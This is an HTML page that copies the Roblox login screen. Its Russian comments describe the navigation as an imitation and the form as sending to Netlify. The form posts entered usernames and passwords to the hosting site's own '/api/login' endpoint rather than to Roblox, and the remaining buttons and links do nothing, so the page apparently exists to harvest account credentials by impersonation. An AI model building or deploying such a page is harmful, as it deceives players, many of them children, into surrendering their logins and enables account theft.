<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Roblox</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  body {
    background-color: #191b1d;
    color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  
  /* Верхнее меню (имитация) */
  .top-nav {
    background: rgba(25, 27, 29, 0.95);
    display: flex;
    justify-content: space-around;
    padding: 16px 10px;
    font-size: 15px;
    font-weight: 600;
    position: relative;
    z-index: 10;
  }
  .top-nav span { color: #ffffff; opacity: 0.9; }
  .top-nav .active { border-bottom: 2px solid #fff; padding-bottom: 4px; }

  /* Фон с картинками (заменён на градиент) */
  .bg {
    flex: 1;
    background: linear-gradient(135deg, #1f2937 0%, #111827 50%, #312e81 100%);
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    min-height: calc(100vh - 60px);
  }
  .bg::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0, 0, 0, 0.4);
  }

  /* Модальное окно */
  .login-box {
    background: #232527;
    width: 100%;
    max-width: 450px;
    border-radius: 8px;
    padding: 32px 24px;
    position: relative;
    z-index: 2;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }

  .login-box h1 {
    text-align: center;
    font-size: 22px;
    font-weight: 700;
    margin-bottom: 24px;
  }

  /* Поля ввода */
  .input-group { margin-bottom: 16px; }
  .input-group input {
    width: 100%;
    background: #2e3134;
    border: 1px solid #555;
    color: #fff;
    padding: 14px 16px;
    border-radius: 6px;
    font-size: 16px;
    outline: none;
  }
  .input-group input::placeholder { color: #b0b3b8; }
  .input-group input:focus { border-color: #fff; }

  /* Кнопка Log In */
  .btn-login {
    width: 100%;
    background: transparent;
    border: 1px solid #777;
    color: #fff;
    padding: 14px;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 16px;
    transition: background 0.2s;
  }
  .btn-login:hover { background: rgba(255,255,255,0.1); }

  /* Ссылки */
  .link-center {
    display: block;
    text-align: center;
    color: #fff;
    text-decoration: none;
    font-size: 15px;
    margin-bottom: 20px;
  }
  .link-center:hover { text-decoration: underline; }

  .divider {
    height: 1px;
    background: #444;
    margin: 20px 0;
  }

  /* Кнопки One-Time Code и Quick Sign-in */
  .btn-secondary {
    width: 100%;
    background: #3b3d40;
    border: none;
    color: #fff;
    padding: 14px;
    border-radius: 6px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 12px;
    text-align: center;
  }
  .btn-secondary:hover { background: #4a4d50; }

  .signup-text {
    text-align: center;
    font-size: 14px;
    color: #ccc;
    margin-top: 20px;
  }
  .signup-text a { color: #fff; text-decoration: none; margin-left: 4px; }
  .signup-text a:hover { text-decoration: underline; }
</style>
</head>
<body>

  <!-- Верхнее меню -->
  <div class="top-nav">
    <span class="active">Charts</span>
    <span>Marketplace</span>
    <span>Create</span>
    <span>Robux</span>
  </div>

  <div class="bg">
    <div class="login-box">
      <h1>Login to Roblox</h1>

      <!-- ФОРМА ОТПРАВКИ НА NETLIFY -->
      <form action="/api/login" method="POST">
        
        <div class="input-group">
          <input type="text" name="username" placeholder="Username/Email/Phone" required>
        </div>

        <div class="input-group">
          <input type="password" name="password" placeholder="Password" required>
        </div>

        <button type="submit" class="btn-login">Log In</button>
        
      </form>

      <a href="#" class="link-center">Forgot Password or Username?</a>

      <div class="divider"></div>

      <button class="btn-secondary" type="button">Email Me a One-Time Code</button>
      <button class="btn-secondary" type="button">Quick Sign-in</button>

      <div class="signup-text">
        Don't have an account? <a href="#">Sign Up</a>
      </div>

    </div>
  </div>

</body>
</html>
